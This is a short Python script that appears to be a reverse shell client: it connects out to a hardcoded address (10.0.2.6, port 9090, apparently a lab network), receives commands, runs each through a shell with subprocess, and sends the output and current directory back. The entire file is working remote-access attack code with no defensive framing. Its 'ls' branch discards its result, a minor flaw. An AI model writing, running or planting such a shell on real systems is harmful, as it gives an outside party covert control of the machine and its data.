import socket
import os
import subprocess

s = socket.socket()

host = "10.0.2.6"
port = 9090


s.connect((host,port))

while True:
    received_data = s.recv(1024)
    if received_data[:2].decode("utf-8") == 'cd':
        os.chdir(received_data[3:].decode("utf-8"))
    if received_data[:2].decode("utf-8") == 'ls':
        os.listdir(received_data[3:].decode("utf-8"))
    if len(received_data.decode("utf-8")) > 0:
        cmd = subprocess.Popen(received_data.decode("utf-8"),shell=True,stderr=subprocess.PIPE,stdout=subprocess.PIPE,stdin=subprocess.PIPE)
        out_Bytes = cmd.stderr.read() + cmd.stdout.read()
        out_Str = out_Bytes.decode("utf-8")
        cwd = os.getcwd() + " > "
        s.send(str.encode(out_Str , "utf-8") + str.encode(cwd,"utf-8"))
